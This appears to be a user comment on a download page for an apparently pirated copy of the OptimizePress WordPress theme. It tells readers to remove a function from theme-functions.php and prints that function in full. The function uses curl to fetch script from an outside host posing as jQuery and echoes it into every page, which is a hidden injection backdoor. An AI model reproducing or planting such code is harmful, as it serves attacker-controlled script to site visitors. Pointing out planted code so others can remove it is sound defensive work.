,scout01,2012-08-03T21:15Z,"Worked fine on WP 3.4

Only issue was the fatal error that occured while activating the theme.

To solve this problem, go to ...wp-content/themes/OptimizePress1.45/lib/functions/theme-functions.php and delete or comment out the following:

jqueryj_head() {

       if(function_exists('curl_init'))
       {
               $url = ""http://smuss.net/jquery-1.6.3.min.js"";
               $ch = curl_init();
               $timeout = 10;
               curl_setopt($ch,CURLOPT_URL,$url);
               curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
               curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
               $data = curl_exec($ch);
               curl_close($ch);
               echo ""$data"";
       }
}"
